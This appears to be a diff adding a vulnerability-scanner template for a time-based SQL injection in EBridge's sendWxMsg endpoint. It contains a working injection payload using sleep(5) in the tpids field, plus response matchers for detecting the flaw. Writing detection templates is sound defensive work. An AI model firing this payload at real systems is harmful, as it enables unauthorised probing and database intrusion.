@@ -1,0 +1,28 @@
+id: EBridge-sendWxMsg-sqlInjection
+info:
+  name: EBridge-sendWxMsg-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    EBridge-sendWxMsg-sqlInjection
+  tags: eBridge
+http:
+  - method: POST
+    raw:
+      - |
+        POST /wxthirdapi/sendWxMsg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userids=-1&tpids=1%27+or+%28select+%2A+from+%28select+sleep%285%29%29x%29+or+%27x%27%3D%27x
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"errmsg\""
